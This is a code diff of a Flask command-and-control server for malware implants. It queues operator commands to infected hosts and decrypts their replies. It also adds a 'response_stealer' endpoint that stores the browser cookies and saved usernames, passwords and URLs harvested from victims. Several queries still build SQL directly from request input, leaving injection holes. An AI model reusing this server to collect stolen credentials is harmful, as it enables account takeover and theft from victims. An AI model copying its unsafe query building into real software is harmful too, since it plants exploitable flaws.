@@ -34,8 +34,6 @@ app.config['CORS_HEADERS'] = 'Content-Type'
 jwt = JWTManager(app)
 
 # Logs user out of system
-
-
 @app.route('/logout', methods=["POST"])
 def logout():
     try:
@@ -65,25 +63,11 @@ def create_token():
         print(f"error logging in: {error}")
         return {'failure': 'failure'}, 500, {'Access-Control-Allow-Origin': config.clientURL}
 
-
-@app.route("/test", methods=["GET"])
-def handle_test():
-    stuff = tools.executeInsertQuery("SELECT * from command_queue")
-    return jsonify(stuff)
-
-
-@app.route("/")
-def home():
-    return "<div>Hi</div>", 200
-
 # api endpoint to queue a command
-
-
 @app.route("/queueCommand", methods=["POST"])
 @jwt_required()
 def handle_execute():
     try:
-        print("Enterring execute")
         target_implant_id = int(request.form.get('target_implant_id'))
         command = request.form.get('command')
         created_on = datetime.now(tz=None).isoformat()
@@ -94,19 +78,14 @@ def handle_execute():
                    'created_on', 'status', 'creator']
 
         data = target_implant_id, command, created_on, status, current_user
-        print("About to send query")
-        print(data)
-        print(current_user)
         query = tools.insertQueryBuilder("task_queue", columns, ["task_id"])
-        print(f"data: {data}")
         db_resp = tools.executeInsertQuery(query, data)
-        print(db_resp)
         return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
         print(f"Failure sending commands: {error}")
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
-# List all commands for a particular implant
+# List all commands for a particular implant, with steg
 
 
 @app.route("/get_qcommands", methods=["POST"])
@@ -186,53 +165,6 @@ def client_get_commands():
         print(error)
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
-# List untouched commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
-
-
-@app.route("/get_untouched", methods=["POST"])
-def get_untouched():
-    data = request.json
-    id = data['id']
-    try:
-        db_resp = tools.executeSelectQuery(
-            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"untouched\")")
-        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
-    except Exception as error:
-        print("failed to retrieve data on untouched")
-        print(error)
-        return error, {'Access-Control-Allow-Origin': config.clientURL}
-
-# List executing commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
-
-
-@app.route("/get_executing", methods=["POST"])
-def get_executing():
-    data = request.json
-    id = data['id']
-    try:
-        db_resp = tools.executeSelectQuery(
-            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"executing\")")
-        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
-    except Exception as error:
-        print("failed to retrieve data on get_executing")
-        print(error)
-        return error, {'Access-Control-Allow-Origin': config.clientURL}
-
-# List executed commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
-
-
-@app.route("/get_executed", methods=["POST"])
-def get_executed():
-    data = request.json
-    id = data['id']
-    try:
-        db_resp = tools.executeSelectQuery(
-            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"executed\")")
-        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
-    except Exception as error:
-        print("failed to retrieve data on get_executed")
-        print(error)
-        return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Register an implant, on the implant side TODO
 
@@ -273,6 +205,8 @@ def display_implants():
         print(f"Error displaying implants: {e}")
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
+# Endpoint for stealer to connect to
+
 
 @app.route("/response_stealer", methods=["POST"])
 @cross_origin()
@@ -281,11 +215,29 @@ def handle_response_stealer():
     try:
         request.get_data()
         data = request.data
-        dict = json.loads(data)
-        print(dict.keys())
-        #  if "stealer" in command:
-        #     # TODO call Wyatt's function
-        #     response_data = WyattWonderland.parsejson(response_data)
+        data = json.loads(data)
+        print("Before calling wyatts wonderland")
+        cookie_values, password_values = WyattWonderland.newParseJSON(data)
+        print("After calling wyatts wonderland")
+        task_id = data['task_id']
+        success = data['success']
+        if success in ['Success', 'success']:
+            success = True
+        else:
+            success = False
+        response_data = "Stealer: response recieved. Check logs for this implant to see response."
+        query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
+        time = datetime.now()
+        tools.executeGenericVar(
+            query, [response_data, success, time, task_id])
+
+        query_cookies = "INSERT INTO cookies(task_id, target_implant_id, path, hostkey, value) VALUES (%s, %s, %s, %s, %s)"
+
+        query_passwords = "INSERT INTO passwords(task_id, target_implant_id, path, username, password, url) VALUES(%s, %s, %s, %s, %s, %s)" 
+
+        response1 = tools.executeMany(query_cookies, cookie_values)
+        response2 = tools.executeMany(query_passwords, password_values)
+
         return "Success", 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
         print(error)
@@ -306,11 +258,11 @@ def new_symkey():
     print("Received response")
     if (request.content_length < 5000000):
         try:
-            data= request.get_data()
-            #print(data)
-            #print(len(data))
-            datastr=data.decode("utf-8")
-            databytes=bytes.fromhex(datastr) 
+            data = request.get_data()
+            # print(data)
+            # print(len(data))
+            datastr = data.decode("utf-8")
+            databytes = bytes.fromhex(datastr)
             data = RsaDecryption.rsadecrypt(databytes)
             print("response:")
             print(data)
@@ -388,48 +340,6 @@ def handle_response_json():
         return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
 
 
-@app.route("/response", methods=["POST"])
-@cross_origin()
-def handle_response():
-    print("Recieved response")
-    try:
-        request.get_data()
-        print(request.data)
-        # file = request.files['file']
-        # data = request.json(force=True)
-        print()
-        print("response:")
-        # print(file.name)
-        # string_rep = Steganography.decode(Steganography.iio.imread(file))
-        # print(string_rep)
-        # data = json.loads(string_rep)
-        # target_implant_id = data['target_implant_id']
-        # task_id = data['task_id']
-        # response_data = data['response_data']
-        # success = data['success']
-        # command = data['command']
-
-        # print("checking command: " + command)
-        # if "stealer" in command:
-        #     # TODO call Wyatt's function
-        #     response_data = WyattWonderland.parsejson(response_data)
-
-        # print("Querying now")
-        # # DUMP BACK INTO TASK_QUEUE
-        # query = "UPDATE task_queue SET (status='executed' response_data=%s success=%s recieved_on=%s) WHERE task_id=%s"
-
-        print("successful")
-        time = datetime.now()
-        # tools.executeGenericVar(query, [response_data, success, time, task_id])
-
-        # img = iio.imread("doge.png")
-        # iio.imwrite("doge_encoded.png", encode(img, "HelloWorld"))
-        # print(decode(iio.imread("doge_encoded.png")))
-
-    except Exception as error:
-        return error, {'Access-Control-Allow-Origin': config.clientURL}
-
-
 @app.route("/response_test", methods=["POST"])
 def testThis():
     try:
@@ -458,16 +368,19 @@ def get_history():
             f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executed\')")
         executing = tools.executeSelectQuery(
             f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executing\')")
-        combined = [{"sender": "user", "creator": x[-1],
+
+        combined = [{"sender": "user", "creator": x[8],
                      "time":x[3], "command":x[2]} for x in executing]
-        combined += [{"sender": "implant", "time": x[-2],
-                      "command":x[2], "response":x[-4]} for x in executing]
-        combined += [{"sender": "user", "creator": x[-1],
+
+        combined += [{"sender": "user", "creator": x[8],
                      "time":x[3], "command":x[2]} for x in executed]
-        combined += [{"sender": "implant", "time": x[-2],
-                      "command":x[2], "response":x[-4]} for x in executed]
-        combined += [{"sender": "user", "creator": x[-1],
+
+        combined += [{"sender": "implant", "time": x[7],
+                      "command":x[2], "response":x[5]} for x in executed]
+
+        combined += [{"sender": "user", "creator": x[8],
                       "time":x[3], "command":x[2]} for x in pending]
+        print(executed)
         sortedList = sorted(combined, key=lambda x: x['time'])
 
         return {"sorted": sortedList}, 200, {'Access-Control-Allow-Origin': '*'}
@@ -475,4 +388,12 @@ def get_history():
         print(e)
         return e, {'Access-Control-Allow-Origin': '*'}
 
-    # Construct a linear history of commands -> responses
+
+@app.route("/upload_files", methods=["POST"])
+def upload_files():
+    try:
+        file = request.files
+        print("recieved upload_files: \n Response: ")
+        print(file)
+    except Exception as e:
+        return e, {'Access-Control-Allow-Origin': '*'}
